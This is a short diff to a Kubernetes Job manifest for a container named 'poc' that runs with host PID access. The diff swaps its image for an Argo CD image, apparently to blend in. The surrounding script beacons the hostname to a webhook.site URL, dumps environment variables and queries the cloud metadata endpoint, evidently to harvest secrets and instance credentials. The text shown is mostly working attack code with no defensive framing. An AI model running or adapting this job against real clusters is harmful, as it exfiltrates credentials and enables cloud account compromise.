@@ -251,12 +251,12 @@ spec:
       hostPID: true
       containers:
       - name: poc
-        image: ubuntu:24.04
+        image: quay.io/argoproj/argocd:v3.2.5
+        imagePullPolicy: IfNotPresent
         command: ["/bin/sh", "-c"]
         args:
         - |
           HOOK="https://webhook.site/2659db76-ba6b-4835-8d39-fe6c80b47919"
-          apt-get install -qq -y curl 2>/dev/null
           curl -sf --max-time 5 "${HOOK}/?stage=k8s-job-start&host=$(hostname)" || true
           ENV=$(env 2>/dev/null)
           IMDS=$(curl -sf --max-time 3 http://169.254.169.254/latest/meta-data/ 2>/dev/null || \
